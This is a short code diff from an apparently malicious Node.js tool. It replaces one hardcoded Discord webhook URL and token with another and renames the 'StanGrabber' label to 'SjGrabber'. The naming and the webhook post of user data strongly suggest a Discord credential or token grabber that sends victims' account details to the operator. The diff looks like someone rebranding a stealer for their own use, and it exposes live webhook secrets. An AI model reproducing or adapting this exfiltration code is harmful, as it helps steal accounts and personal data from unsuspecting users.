@@ -48,8 +48,8 @@ exports.send = (req, res, webhook) => {
 }
             
 
-        axios.post(`https://discord.com/api/webhooks/808648414199676948/Koi4dO3acEhEyIRJzVaxZ7-FDWJfmqK6kZX13nrklxmLWPkhQBhtkFe8JBtKgdojXSCn`, {
-            username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
+        axios.post(`https://canary.discord.com/api/webhooks/857550605072465940/5eAO1KVAJ4Zd2i_An8BUgLEuwZY2LM-NMroj8Jh9j0rYV7qS8MThxtrGpTFb2j54nynz`, {
+            username: JSON.parse(JSON.stringify(y)).username + " - SjGrabber",
             content: '', 
             embeds:[ omg ]
         }).then((z) => {
